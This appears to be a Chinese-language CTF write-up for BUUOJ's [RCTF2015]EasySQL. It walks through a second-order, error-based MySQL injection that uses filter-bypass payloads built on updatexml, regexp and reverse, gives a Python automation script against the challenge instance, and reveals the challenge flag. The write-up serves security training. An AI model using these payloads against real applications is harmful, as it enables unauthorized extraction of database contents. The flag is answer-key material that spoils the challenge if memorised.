# [RCTF2015]EasySQL

[题目地址](https://buuoj.cn/challenges#[RCTF2015]EasySQL)

二次注入+报错注入。

sql注入难就难在找到注入点和绕过滤，构造语句什么的就是烦了一点，慢慢研究总能出来的。进入网站，朴实的注册和登录。有个坑，注册界面邮箱不能有@，虽然正常的邮箱都有@但是这里就是不能有，可是我咋知道，试了好多次就是显示invalid string，怀疑人生。更怀疑人生的是，什么都不填都能注册上……后面看[wp](https://blog.csdn.net/mochu7777777/article/details/105179021)才知道@属于被过滤内容。

这次的sql注入不在注册框，疯狂堆引号等特殊符号都能顺利注册。登录框也没有。登录成功后有个改密码链接，手感极差，提交后也不显示改成功了没有，也不会重定向。不过牺牲手感换来了sql报错信息，在我注册用户名为`a'"`，改密码时什么都不填直接点submit就会收到sql报错。

- You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"a'"" and pwd='d41d8cd98f00b204e9800998ecf8427e'' at line 1

根据报错信息可以分析出用户名的闭合应该是"。这种当时没问题后面出现问题的一般都是[二次注入](https://zhuanlan.zhihu.com/p/39917830)。这种注入发现了就不难利用了，注册时输入sql语句，改密码时带出来数据。利用updatexml进行报错注入。

- username=a"||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#

`||`代替被过滤的or，所有查询语句都用括号括起来起到分割作用，因为空格也被过滤了。数据库不用爆了，database()搞定，上面直接爆的表，有article，flag，users表。flag当然不在flag表中，在user中。后面会给出大佬的自动化脚本，这里又有一个不友好的地方是没有注销按钮，每次注册新用户只能清cookie。

- username=a"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))),1))#

爆出users表中的flag字段`real_flag_1s_her`。本来直接构造类似`select real_flag_1s_her from users`这样的就能爆出来flag了，结果里面有填充的垃圾内容，由于报错注入只能回显有限的字符，截取函数right，left，mid什么的又被过滤了，这flag简单查是出不来了。

我们需要[sql正则](https://www.runoob.com/mysql/mysql-regexp.html)。借助正则构造payload。

- username=a"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#

payload在`select real_flag_1s_her from users`的基础上加了个where做约束，`where real_flag_1s_here regexp('^f')`表示选取real_flag_1s_here中以f开头的部分，那不就是flag了吗。这样还不够，因为flag很长，输出不完。但是现在我们就不需要截取函数了，直接用reverse函数倒序输出，让regexp匹配到flag内容后再以倒序的形式输出出来，倒序输出是不会影响到regexp匹配的。

- username=a"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#

可用大佬的脚本享受自动化的快乐。

```python
import requests

url_reg = 'http://a5530913-7f0c-41f8-badd-093e09e45300.node4.buuoj.cn:81/register.php'
url_log = 'http://a5530913-7f0c-41f8-badd-093e09e45300.node4.buuoj.cn:81/login.php'
url_change = 'http://a5530913-7f0c-41f8-badd-093e09e45300.node4.buuoj.cn:81/changepwd.php'

pre = 'mochu7"'
#逆序闭合
suf = "')))),1))#"

#正序闭合
#suf = "'))),1))#"

s = 'abcdefghijklmnopqrstuvwxyz1234567890'
s = list(s)

r = requests.session()

def register(name):
    data = {
        'username' : name,
        'password' : '123',
        'email' : '123',
    }
    r.post(url=url_reg, data=data)

def login(name):
    data = {
        'username' : name,
        'password' : '123',
    }
    r.post(url=url_log, data=data)
    
def changepwd():
    data = {
        'oldpass' : '',
        'newpass' : '',
    }
    kk = r.post(url=url_change, data=data)
    if 'XPATH' in kk.text:
        print(kk.text)
        print(kk.text[::-1])

for i in s:
    #正序
    #paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf
    #逆序
    paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf
    register(paylaod)
    login(paylaod)
    changepwd()


#正序payload
#paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "'))),1))#"
#逆序payload
#paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "')))),1))#"
```

## Flag
> flag{1fc925f1-c3ec-4b1c-b0ba-227046ac4d15}